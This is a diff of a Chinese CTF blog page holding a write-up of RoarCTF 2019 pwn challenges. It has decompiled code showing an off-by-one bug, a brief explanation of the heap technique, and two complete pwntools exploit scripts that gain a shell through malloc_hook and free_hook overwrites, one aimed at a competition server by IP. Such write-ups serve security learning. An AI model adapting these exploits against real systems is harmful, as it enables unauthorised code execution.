@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn,">
+  <meta name="keywords" content=",,,">
 
 
 
@@ -83,14 +83,14 @@
 
 <meta name="description" content="easy_pwn123456789101112131415// off-by-one__int64 __fastcall sub_E26(signed int a1, unsigned int a2)&amp;#123;  __int64 result; // rax  if ( a1 &amp;gt; a2 )    return a2;  if ( a2 - a1 == 10 )    LODWORD(res">
 <meta name="keywords" content="pwn">
-<meta property="og:type" content="article">
+<meta property="og:type" content="website">
 <meta property="og:title" content="RoarCtf - pwn">
-<meta property="og:url" content="http://yoursite.com/2019/10/15/RoarCTF/index.html">
+<meta property="og:url" content="http://yoursite.com/RoarCTF.html">
 <meta property="og:site_name" content="R4bb1t的ctf博客">
 <meta property="og:description" content="easy_pwn123456789101112131415// off-by-one__int64 __fastcall sub_E26(signed int a1, unsigned int a2)&amp;#123;  __int64 result; // rax  if ( a1 &amp;gt; a2 )    return a2;  if ( a2 - a1 == 10 )    LODWORD(res">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/images/RoarCTF/1.jpg">
-<meta property="og:updated_time" content="2019-10-16T08:18:06.874Z">
+<meta property="og:updated_time" content="2019-10-16T08:20:23.596Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RoarCtf - pwn">
 <meta name="twitter:description" content="easy_pwn123456789101112131415// off-by-one__int64 __fastcall sub_E26(signed int a1, unsigned int a2)&amp;#123;  __int64 result; // rax  if ( a1 &amp;gt; a2 )    return a2;  if ( a2 - a1 == 10 )    LODWORD(res">
@@ -124,7 +124,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/15/RoarCTF/">
+  <link rel="canonical" href="http://yoursite.com/RoarCTF.html">
 
 
 
@@ -286,86 +286,25 @@
 
   <div id="posts" class="posts-expand">
     
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/15/RoarCTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="R4bb1t">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R4bb1t的ctf博客">
-    </span>
-
     
+    
+    <div class="post-block page">
       <header class="post-header">
 
-        
-        
-          <h1 class="post-title" itemprop="name headline">RoarCtf - pwn</h1>
-        
+	<h1 class="post-title" itemprop="name headline">RoarCtf - pwn</h1>
 
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-15T16:57:25+08:00">
-                2019-10-15
-              </time>
-            
 
-            
 
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</header>
 
       
       
-
       
-        <h2 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// off-by-one</span></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;   <span class="comment">//off-by-one</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+      <div class="post-body">
+        
+        
+          <h2 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// off-by-one</span></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;   <span class="comment">//off-by-one</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <p>write 函数中只要输入的size 减去原先的 = 10就能多写一个字节，因为堆块的申请是用calloc所以不能直接free一个unsortbin再申请出来的方式漏泄地址；申请三个堆块chunk0,chunk1,chunk2覆写chunk1的size为chunk1.size+chunk2.size，free(1),这样chunk2就被放到unsortbin中去了，再申请chunk1.size大小的堆块就能把main_arena写到chunk2去，再show。接着就malloc_hook填onegadget</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"><span class="comment"># nc 39.97.182.233 38020</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"39.97.182.233"</span>,<span class="string">"38020 "</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"><span class="comment">#内存地址随机化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"breakpoint_addr --&gt; "</span> + hex(text_base + <span class="number">0x202048</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr))) </span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">	ru(<span class="string">"choice: "</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line">	ru(<span class="string">"size: "</span>)</span><br><span class="line">	sl(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(id,size,data)</span>:</span></span><br><span class="line">	ru(<span class="string">"choice: "</span>)</span><br><span class="line">	sl(<span class="string">'2'</span>)</span><br><span class="line">	ru(<span class="string">"index: "</span>)</span><br><span class="line">	sl(str(id))</span><br><span class="line">	ru(<span class="string">"size: "</span>)</span><br><span class="line">	sl(str(size))</span><br><span class="line">	ru(<span class="string">"content: "</span>)</span><br><span class="line">	sd(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(id)</span>:</span></span><br><span class="line">	ru(<span class="string">"choice: "</span>)</span><br><span class="line">	sl(<span class="string">'3'</span>)</span><br><span class="line">	ru(<span class="string">"index: "</span>)</span><br><span class="line">	sl(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id)</span>:</span></span><br><span class="line">	ru(<span class="string">"choice: "</span>)</span><br><span class="line">	sl(<span class="string">'4'</span>)</span><br><span class="line">	ru(<span class="string">"index: "</span>)</span><br><span class="line">	sl(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk_addr = <span class="number">0x555555756048</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">0x28</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x88</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x58</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x28</span>)<span class="comment">#3</span></span><br><span class="line">write(<span class="number">0</span>,<span class="number">0x28</span>+<span class="number">10</span>,<span class="number">0x28</span>*<span class="string">'a'</span> + <span class="string">'\xf1'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x88</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">"content: "</span>)</span><br><span class="line">main_arena = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">fack_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">realloc_hook = libc_base + libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">'realloc'</span>]</span><br><span class="line">onegadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.warn(<span class="string">"main_arena --&gt; %s"</span>,hex(main_arena))</span><br><span class="line">log.warn(<span class="string">"fack_chunk --&gt; %s"</span>,hex(fack_chunk))</span><br><span class="line">log.warn(<span class="string">"system --&gt; %s"</span>,hex(system))</span><br><span class="line">create(<span class="number">0x58</span>)</span><br><span class="line">write(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">write(<span class="number">1</span>,<span class="number">0x88</span>+<span class="number">10</span>,<span class="number">0x88</span>*<span class="string">'a'</span> + <span class="string">'\x71'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x10</span>,p64(fack_chunk)*<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">create(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">write(<span class="number">5</span>,<span class="number">8</span>+<span class="number">0x13</span>,<span class="number">0xb</span>*<span class="string">'a'</span> + p64(onegadget) + p64(realloc))</span><br><span class="line">create(<span class="number">32</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.intera</span><br></pre></td></tr></table></figure>
@@ -390,63 +329,15 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">""</span>)</span><br><span class="line">	<span class="comment"># elf = ELF('./')</span></span><br><span class="line"><span class="comment">#内存地址随机化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"breakpoint_addr --&gt; "</span> + hex(text_base + <span class="number">0x202058</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr))) </span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span><span class="params">(size,data=<span class="string">''</span>)</span>:</span></span><br><span class="line">	ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line">	ru(<span class="string">"Size?\n"</span>)</span><br><span class="line">	sl(str(size))</span><br><span class="line">	<span class="keyword">if</span> data:</span><br><span class="line">		ru(<span class="string">"Content?\n"</span>)</span><br><span class="line">		sd(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">	ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lock</span><span class="params">()</span>:</span></span><br><span class="line">	ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	sl(<span class="string">'666'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	realloc(<span class="number">0x78</span>,<span class="string">'a'</span>)</span><br><span class="line">	realloc(<span class="number">0</span>)</span><br><span class="line">	realloc(<span class="number">0x100</span>,<span class="string">'b'</span>)</span><br><span class="line">	realloc(<span class="number">0</span>)</span><br><span class="line">	realloc(<span class="number">0x8</span>,<span class="string">'c'</span>)</span><br><span class="line">	realloc(<span class="number">0</span>)</span><br><span class="line">	realloc(<span class="number">0x100</span>,<span class="string">'b'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		free()</span><br><span class="line">	realloc(<span class="number">0</span>)</span><br><span class="line">	realloc(<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">	pay = <span class="number">0x70</span>*<span class="string">'a'</span> + p64(<span class="number">0x21</span>)*<span class="number">2</span> + <span class="string">'\x60\x07\xdd'</span></span><br><span class="line">	realloc(<span class="number">0x180</span>,pay)</span><br><span class="line">	realloc(<span class="number">0</span>)</span><br><span class="line">	realloc(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">	realloc(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	pay = p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">	realloc(<span class="number">0x100</span>,pay)</span><br><span class="line">	libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ed8b0</span></span><br><span class="line">	free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">	onegadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">	log.warn(<span class="string">"libc_base --&gt; %s"</span>,hex(libc_base))</span><br><span class="line">	log.warn(<span class="string">"free_hook --&gt; %s"</span>,hex(free_hook))</span><br><span class="line"></span><br><span class="line">	lock()</span><br><span class="line">	pay = <span class="string">'a'</span>*<span class="number">0x78</span> + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">	realloc(<span class="number">0x180</span>,pay)</span><br><span class="line">	realloc(<span class="number">0</span>)</span><br><span class="line">	realloc(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">	realloc(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	realloc(<span class="number">0x10</span>,p64(onegadget))</span><br><span class="line">	free()</span><br><span class="line">	<span class="comment"># debug()</span></span><br><span class="line">	p.interactive()</span><br><span class="line">pwn()<span class="comment">#关闭aslr</span></span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment"># 	try:</span></span><br><span class="line"><span class="comment"># 		i += 1</span></span><br><span class="line"><span class="comment"># 		log.info(str(i))</span></span><br><span class="line"><span class="comment"># 		p = process('./pwn')</span></span><br><span class="line"><span class="comment"># 		pwn()</span></span><br><span class="line"><span class="comment"># 	except Exception:</span></span><br><span class="line"><span class="comment"># 		# log.warn("wrong!")</span></span><br><span class="line"><span class="comment"># 		p.close()</span></span><br></pre></td></tr></table></figure>
 <p>参考题目：<a href="https://xz.aliyun.com/t/6259#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/6259#toc-0</a></p>
 
+        
+      </div>
+      
+      
       
     </div>
     
     
     
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/09/21/IO_FILE/" rel="next" title="IO_FILE泄露libc">
-                <i class="fa fa-chevron-left"></i> IO_FILE泄露libc
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
   </div>
 
 
@@ -506,7 +397,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
